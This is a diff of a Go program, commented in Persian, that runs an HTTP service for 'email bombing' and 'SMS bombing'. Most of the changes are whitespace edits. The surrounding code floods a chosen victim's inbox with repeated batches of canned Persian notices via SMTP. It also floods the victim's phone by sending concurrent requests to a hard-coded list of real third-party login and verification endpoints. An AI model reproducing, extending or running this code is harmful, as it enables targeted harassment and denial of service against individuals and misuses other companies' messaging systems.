@@ -17,8 +17,8 @@ import (
 )
 
 var longMessages []string
-
 var activeSessions sync.Map
+
 var smtpConfig = struct {
 	Host     string
 	Port     int
@@ -43,7 +43,6 @@ type SessionStatus struct {
 
 func init() {
 	longMessages = seedLongMessages()
-
 	smtpConfig.Host = envOr("SMTP_HOST", "mail.mozahemyab.online")
 	if p, err := parseEnvInt("SMTP_PORT", 587); err == nil {
 		smtpConfig.Port = p
@@ -53,7 +52,6 @@ func init() {
 	}
 	smtpConfig.Username = envOr("SMTP_USERNAME", "info@mozahemyab.online")
 	smtpConfig.Password = envOr("SMTP_PASSWORD", "")
-
 	if smtpConfig.Password == "" {
 		log.Println("🔴 هشدار امنیتی جدی: رمز عبور SMTP از طریق متغیر محیطی SMTP_PASSWORD تنظیم نشده است.")
 		log.Println("🔴 ایمیل‌ها ممکن است به دلیل عدم احراز هویت ارسال نشوند.")
@@ -134,7 +132,6 @@ func handleSendEmails(w http.ResponseWriter, r *http.Request) {
 	if batchSize <= 0 {
 		batchSize = req.NumEmailsToSend
 	}
-
 	if batchSize <= 0 {
 		writeJSON(w, http.StatusBadRequest, apiError{Error: "اندازه مرحله یا تعداد ایمیل معتبر نیست."})
 		return
@@ -177,7 +174,6 @@ func runEmailBombing(recipientEmail string, batchSize int, totalBatches int, int
 	if interval > 0 {
 		intervalDesc = interval.String()
 	}
-
 	log.Printf("📧 شروع ارسال ایمیل | گیرنده: %s | مراحل: %d | اندازه هر مرحله: %d | فاصله: %s", recipientEmail, totalBatches, batchSize, intervalDesc)
 
 	for batch := 0; batch < totalBatches; batch++ {
@@ -195,13 +191,11 @@ func runEmailBombing(recipientEmail string, batchSize int, totalBatches int, int
 				subject = deriveSubject(msg)
 				nextMessageIndex++
 			}
-
 			if err := sendSMTPEmail(smtpConfig.Host, smtpConfig.Port, smtpConfig.Username, smtpConfig.Password, recipientEmail, subject, body); err != nil {
 				failed++
 			} else {
 				sent++
 			}
-
 			time.Sleep(1 * time.Second)
 		}
 
@@ -209,7 +203,6 @@ func runEmailBombing(recipientEmail string, batchSize int, totalBatches int, int
 			time.Sleep(interval)
 		}
 	}
-
 	log.Printf("📊 خلاصه ارسال ایمیل: موفق=%d، ناموفق=%d", sent, failed)
 }
 
@@ -228,13 +221,10 @@ func deriveSubject(message string) string {
 
 func sendSMTPEmail(host string, port int, username, password, to, subject, body string) error {
 	addr := fmt.Sprintf("%s:%d", host, port)
-
 	if password == "" {
 		return fmt.Errorf("رمز عبور SMTP برای احراز هویت خالی است")
 	}
-
 	auth := smtp.PlainAuth("", username, password, host)
-
 	from := username
 	headers := map[string]string{
 		"From":                      fmt.Sprintf("%s <%s>", mime.QEncoding.Encode("UTF-8", "فرستنده"), from),
@@ -268,51 +258,32 @@ func sendSMTPEmail(host string, port int, username, password, to, subject, body 
 func seedLongMessages() []string {
 	return []string{
 		`موضوع: اطلاعیه مهم: به‌روزرسانی سیستم مدیریت مالی
-
 با سلام و احترام،
-
 با توجه به تلاش‌های تیم توسعه، به اطلاع می‌رساند که از تاریخ 2025-10-12، سیستم مدیریت مالی شرکت با یک به‌روزرسانی جامع روبرو خواهد شد. این به‌روزرسانی شامل بهبودهای اساسی در رابط کاربری، افزایش سرعت پردازش و ارتقاء پروتکل‌های امنیتی است.
 هدف از این تغییرات، فراهم کردن بستری امن‌تر و کارآمدتر برای مدیریت امور مالی شماست. جزئیات کامل و راهنمای استفاده از قابلیت‌های جدید به زودی در پورتال داخلی شرکت منتشر خواهد شد. از صبر و همکاری شما سپاسگزاریم.
-
 با تشکر،
 تیم پشتیبانی فنی`,
-
 		`موضوع: دعوت به رویداد انحصاری: نوآوری‌های دیجیتال در سال ۲۰۲۵
-
 با درود،
-
 شما به شرکت در وبینار انحصاری ما در مورد نقش هوش مصنوعی در تحول کسب‌وکارهای مدرن دعوت شده‌اید. در این وبینار، کارشناسان برجسته در این حوزه به بررسی آخرین روندهای تکنولوژی و استراتژی‌های پیاده‌سازی موفق هوش مصنوعی می‌پردازند. برای ثبت‌نام و دریافت اطلاعات بیشتر، لطفاً به وب‌سایت ما مراجعه کنید.
-
 با احترام فراوان،
 واحد روابط عمومی و بازاریابی`,
-
 		`موضوع: یادآوری: تکمیل فرم ارزیابی عملکرد سه‌ماهه
-
 سلام،
-
 پیرو اطلاعیه قبلی، خواهشمند است نسبت به تکمیل فرم ارزیابی عملکرد سه‌ماهه خود اقدام فرمایید. ارزیابی به موقع شما، به ما در برنامه‌ریزی بهتر برای رشد فردی و توسعه سازمان کمک شایانی می‌کند.
 مهلت تکمیل فرم تا پایان روز 2025-10-12 است. در صورت نیاز به راهنمایی یا داشتن هرگونه سوال، لطفاً با مدیر مستقیم خود یا واحد منابع انسانی تماس بگیرید. از همکاری شما متشکریم.
-
 با سپاس،
 دپارتمان منابع انسانی`,
-
 		`موضوع: پیشنهاد ویژه: پکیج‌های جدید آموزشی برای توسعه مهارت‌ها
-
 با سلام،
-
 با توجه به درخواست‌های متعدد شما، مجموعه جدیدی از پکیج‌های آموزشی تخصصی در زمینه‌های [نام چند حوزه مثل: هوش مصنوعی، برنامه‌نویسی پایتون، مدیریت پروژه] آماده شده است. این دوره‌ها توسط اساتید مجرب طراحی شده‌اند و به شما در ارتقاء مهارت‌های حرفه‌ای‌تان کمک خواهند کرد.
 برای مشاهده لیست کامل دوره‌ها و استفاده از تخفیف ویژه برای همکاران، به وب‌سایت آموزشی ما مراجعه کنید. این فرصت را از دست ندهید!
-
 با آرزوی موفقیت،
 تیم آموزش و توسعه`,
-
 		`موضوع: اطلاعیه: تغییر در سیاست‌های دورکاری از ماه آینده
-
 همکاران محترم،
-
 پیرو جلسات مدیریتی اخیر، به اطلاع می‌رساند که از ابتدای ماه [نام ماه آینده]، تغییراتی در سیاست‌های دورکاری اعمال خواهد شد. هدف از این تغییرات، افزایش همکاری تیمی و بهبود عملکرد کلی سازمان است.
 جلسه‌ای توجیهی در تاریخ 2025-10-12 برگزار خواهد شد تا جزئیات کامل این تغییرات و نحوه اجرای آن‌ها برای شما توضیح داده شود. حضور در این جلسه برای همه همکاران الزامی است.
-
 با تشکر از توجه شما،
 مدیریت اجرایی`,
 	}
@@ -374,13 +345,12 @@ func runSmsBombing(phone string, targets []smsTarget, batchSize int, interval ti
 		status.IsRunning = false
 		activeSessions.Store(phone, status)
 		// log.Printf("✅ عملیات پیامک برای شماره %s به پایان رسید. مراحل: %d، تلاش‌ها: %d، موفق: %d",
-		// 	phone, status.CompletedBatches, status.TotalAttempts, status.TotalSuccess)
+		//  phone, status.CompletedBatches, status.TotalAttempts, status.TotalSuccess)
 	}()
 
 	if batchSize <= 0 {
 		batchSize = len(targets)
 	}
-
 	if totalBatches <= 0 && interval <= 0 {
 		totalBatches = 1
 	}
@@ -402,15 +372,12 @@ func runSmsBombing(phone string, targets []smsTarget, batchSize int, interval ti
 	sendBatch := func(batchNumber int) (attempts int, successes int) {
 		log.Printf("📤 مرحله %d/%s شروع شد برای %s", batchNumber+1, batchesDesc, phone)
 		ch := make(chan int, batchSize)
-
 		for i := 0; i < batchSize; i++ {
 			idx := (nextTargetIndex + i) % len(targets)
 			target := targets[idx]
 			go sms(target.url, target.data, ch)
 		}
-
 		nextTargetIndex = (nextTargetIndex + batchSize) % len(targets)
-
 		for i := 0; i < batchSize; i++ {
 			statusCode := <-ch
 			attempts++
@@ -421,7 +388,6 @@ func runSmsBombing(phone string, targets []smsTarget, batchSize int, interval ti
 				// fmt.Printf("❌ خطا در ارسال (کد: %d)\n", statusCode)
 			}
 		}
-
 		// log.Printf("✔️ مرحله %d کامل شد | تلاش: %d | موفق: %d", batchNumber+1, attempts, successes)
 		return attempts, successes
 	}
@@ -431,7 +397,6 @@ func runSmsBombing(phone string, targets []smsTarget, batchSize int, interval ti
 			// log.Printf("⏳ انتظار %v قبل از مرحله %d برای %s", interval, batch+1, phone)
 			time.Sleep(interval)
 		}
-
 		attempts, successes := sendBatch(batch)
 		status.CompletedBatches++
 		status.TotalAttempts += attempts
@@ -441,7 +406,6 @@ func runSmsBombing(phone string, targets []smsTarget, batchSize int, interval ti
 		if totalBatches > 0 && batch+1 >= totalBatches {
 			break
 		}
-
 		if interval <= 0 && totalBatches <= 0 && batch >= 0 {
 			break
 		}
@@ -450,7 +414,6 @@ func runSmsBombing(phone string, targets []smsTarget, batchSize int, interval ti
 
 func seedTargets(phone string) []smsTarget {
 	cleanPhone := strings.TrimPrefix(phone, "0")
-
 	return []smsTarget{
 		{"https://3tex.io/api/1/users/validation/mobile", map[string]interface{}{"receptorPhone": "0" + cleanPhone}},
 		{"https://deniizshop.com/api/v1/sessions/login_request", map[string]interface{}{"mobile_phone": "0" + cleanPhone}},
@@ -738,7 +701,6 @@ func handleSmsBombing(w http.ResponseWriter, r *http.Request) {
 
 	interval := time.Duration(data.IntervalMinutes) * time.Minute
 	totalBatches := data.TotalBatches
-
 	if data.TotalBatches <= 0 {
 		writeJSON(w, http.StatusBadRequest, apiError{Error: "تعداد مراحل (total_batches) باید حداقل 1 باشد."})
 		return
@@ -823,7 +785,6 @@ func main() {
 	// log.Println("   POST /send_emails  - ارسال ایمیل‌ها")
 	// log.Println("   GET  /sms_status   - بررسی وضعیت عملیات")
 	// log.Println("   GET  /healthz      - بررسی سلامت سرور")
-
 	if err := http.ListenAndServe(":8080", mux); err != nil {
 		log.Fatalf("listen and serve: %v", err)
 	}
@@ -835,16 +796,13 @@ func sms(url string, header map[string]interface{}, ch chan<- int) {
 		ch <- http.StatusInternalServerError
 		return
 	}
-
 	time.Sleep(2 * time.Second)
-
 	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
 	if err != nil {
 		ch <- http.StatusInternalServerError
 		return
 	}
 	defer resp.Body.Close()
-
 	io.ReadAll(resp.Body)
 	ch <- resp.StatusCode
 }
